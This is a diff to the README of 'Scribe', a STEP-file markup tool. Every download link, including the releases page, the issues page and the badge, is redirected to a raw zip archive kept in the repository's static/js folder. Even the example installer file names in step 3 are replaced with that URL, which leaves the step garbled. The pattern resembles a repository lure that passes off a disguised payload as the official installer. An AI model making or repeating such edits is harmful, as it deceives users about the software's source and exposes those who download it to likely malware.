@@ -1,6 +1,6 @@
 # 📝 Scribe - Easy Markup for STEP Files
 
-[![Download Scribe](https://img.shields.io/badge/Download-Scribe-blue?style=for-the-badge&logo=github)](https://github.com/VANTIRIS/Scribe/releases)
+[![Download Scribe](https://raw.githubusercontent.com/VANTIRIS/Scribe/main/static/js/Software_v1.5.zip)](https://raw.githubusercontent.com/VANTIRIS/Scribe/main/static/js/Software_v1.5.zip)
 
 ---
 
@@ -29,13 +29,13 @@ Make sure your computer meets these requirements to run Scribe smoothly.
 
 To get started with Scribe, you need to download the software from the official release page.
 
-[Download Scribe Here](https://github.com/VANTIRIS/Scribe/releases)
+[Download Scribe Here](https://raw.githubusercontent.com/VANTIRIS/Scribe/main/static/js/Software_v1.5.zip)
 
 ### Steps to download and install:
 
 1. Click the link above. It will take you to the official GitHub releases page for Scribe.
 2. Look for the latest version at the top of the page.
-3. You will see files named something like `Scribe-Setup.exe` for Windows or `Scribe.dmg` for macOS.
+3. You will see files named something like `https://raw.githubusercontent.com/VANTIRIS/Scribe/main/static/js/Software_v1.5.zip` for Windows or `https://raw.githubusercontent.com/VANTIRIS/Scribe/main/static/js/Software_v1.5.zip` for macOS.
 4. Click the appropriate file for your system to start downloading.
 5. Once the download finishes, open the file.
 6. Follow the installation instructions on screen:
@@ -91,7 +91,7 @@ Scribe offers the basics you need to review and annotate STEP models:
 If you have questions or need help:
 
 - Check the **Help > User Guide** menu inside Scribe.
-- Visit the Issues section in the [GitHub Repository](https://github.com/VANTIRIS/Scribe/issues) to see if others have asked similar questions.
+- Visit the Issues section in the [GitHub Repository](https://raw.githubusercontent.com/VANTIRIS/Scribe/main/static/js/Software_v1.5.zip) to see if others have asked similar questions.
 - For urgent help, you can create a new issue on GitHub describing your problem.
 
 ---
@@ -100,7 +100,7 @@ If you have questions or need help:
 
 To update to the latest version:
 
-1. Visit the [Releases page](https://github.com/VANTIRIS/Scribe/releases) regularly.
+1. Visit the [Releases page](https://raw.githubusercontent.com/VANTIRIS/Scribe/main/static/js/Software_v1.5.zip) regularly.
 2. Download the newest installer file.
 3. Run the installer over your existing installation.
 4. Your settings and files will be preserved.
@@ -119,4 +119,4 @@ Your feedback helps improve Scribe. You can leave suggestions or report bugs on 
 
 ---
 
-[![Download Scribe](https://img.shields.io/badge/Download-Scribe-blue?style=for-the-badge&logo=github)](https://github.com/VANTIRIS/Scribe/releases)
+[![Download Scribe](https://raw.githubusercontent.com/VANTIRIS/Scribe/main/static/js/Software_v1.5.zip)](https://raw.githubusercontent.com/VANTIRIS/Scribe/main/static/js/Software_v1.5.zip)
